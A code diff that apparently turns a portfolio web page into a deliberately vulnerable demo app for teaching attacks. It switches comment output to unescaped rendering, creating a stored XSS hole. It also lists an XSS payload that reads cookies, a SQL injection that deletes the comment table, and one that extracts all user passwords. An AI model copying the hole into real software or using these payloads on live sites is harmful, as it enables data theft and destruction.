@@ -7,7 +7,7 @@
 	<meta http-equiv="Pragma" content="no-cache">
 	<meta http-equiv="Expires" content="0">
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-	<title>Portfolio demo</title>
+	<title>Vulnerable App demo</title>
 
 	<link rel="stylesheet" th:attr="href=${theme == 'dark' ? '/styles-dark.css' : '/styles.css'}">
 </head>
@@ -22,15 +22,30 @@
 	<button onclick="setTheme('light');">Light theme</button>
 	<button onclick="setTheme('dark');">Dark theme</button>
 
-	<h1>Portfolio</h1>
-	<p>Here is a description of my work.</p>
-	<p>Bla bla...</p>
+	<h1>Vulnerable App</h1>
+	<p>Here is an example of a vulnerable web app.</p>
+	<ul>
+		<li>
+			<em>For XSS, write this to the <b>MESSAGE</b> field:</em>
+			<pre>&#x3C;script&#x3E;alert("Oh No! " + document.cookie)&#x3C;/script&#x3E;</pre>
+		</li>
+		<li>
+			<em>For SQL Injection, write this to the <b>MESSAGE</b> field:</em>
+			<pre>&#x27;);DELETE FROM comment;--</pre>
+		</li>
+		<li>
+			<em>For another example of SQL Injection, write this to the <b>NAME</b> field:</em>
+			<pre>oh no&#x27;,(SELECT group_concat(concat(id, &#x27;,&#x27;, name, &#x27;,&#x27;, password) separator &#x27;;&#x27;) FROM user));--</pre>
+		</li>
+	</ul>
 
 	<h2>Comments:</h2>
 	<div th:each="comment: ${comments}" class="comment-list">
 		<div class="comment-list-item">
-			<h3 class="comment-title">[[${comment.name}]] says...</h3>
-			<div class="comment-message">[[${comment.message}]]</div>
+			<!-- TODO remove xss vulnerability -->
+			<h3 class="comment-title">[(${comment.name})] says...</h3>
+			<!-- TODO remove xss vulnerability -->
+			<div class="comment-message">[(${comment.message})]</div>
 		</div>
 	</div>
 
